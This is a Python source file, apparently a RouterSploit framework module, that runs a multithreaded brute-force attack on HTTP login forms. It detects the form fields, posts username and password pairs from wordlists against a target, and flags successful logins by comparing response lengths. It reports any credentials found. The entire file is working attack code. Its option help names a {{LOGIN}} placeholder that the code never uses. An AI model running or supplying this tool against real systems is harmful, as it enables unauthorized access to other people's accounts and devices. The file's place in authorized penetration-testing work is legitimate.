import threading
import requests
import itertools
from bs4 import BeautifulSoup

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against HTTP form service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Form Bruteforce',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    form = exploits.Option('auto', 'Post Data: auto or in form login={{LOGIN}}&password={{PASS}}&submit')
    path = exploits.Option('/login.php', 'URL Path')

    credentials = []
    data = ""
    invalid = {"min": 0, "max": 0}

    def run(self):
        self.credentials = []
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        try:
            requests.get(url)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return

        # authentication type
        if self.form == 'auto':
            self.data = self.detect_form()

            if self.data is None:
                print_error("Could not detect form")
                return
        else:
            self.data = self.form

        print_status("Using following data: ", self.data)

        # invalid authentication
        self.invalid_auth()

        # running threads
        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def invalid_auth(self):
        for i in range(0, 21, 5):
            url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
            headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

            user = "A" * i
            password = "A" * i

            postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
            r = requests.post(url, headers=headers, data=postdata)
            l = len(r.text)

            if i == 0:
                self.invalid = {"min": l, "max": l}

            if l < self.invalid["min"]:
                self.invalid["min"] = l
            elif l > self.invalid["max"]:
                self.invalid["max"] = l

    def detect_form(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
        r = requests.get(url)
        soup = BeautifulSoup(r.text, "lxml")

        form = soup.find("form")

        if form is None:
            return None

        if len(form) > 0:
            res = []
            for inp in form.findAll("input"):
                if 'name' in inp.attrs.keys():
                    if inp.attrs['name'].lower() in ["username", "user", "login"]:
                        res.append(inp.attrs['name'] + "=" + "{{USER}}")
                    elif inp.attrs['name'].lower() in ["password", "pass"]:
                        res.append(inp.attrs['name'] + "=" + "{{PASS}}")
                    else:
                        if 'value' in inp.attrs.keys():
                            res.append(inp.attrs['name'] + "=" + inp.attrs['value'])
                        else:
                            res.append(inp.attrs['name'] + "=")
        return '&'.join(res)

    def target_function(self, running, data):
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

        print_status(name, 'process is starting...')

        while running.is_set():
            try:
                user, password = data.next()
                user = user.strip()
                password = password.strip()

                postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
                r = requests.post(url, headers=headers, data=postdata)
                l = len(r.text)

                if l < self.invalid["min"] or l > self.invalid["max"]:
                    running.clear()
                    print_success("{}: Authentication succeed!".format(name), user, password)
                    self.credentials.append((user, password))
                else:
                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
            except StopIteration:
                break

        print_status(name, 'process is terminated.')
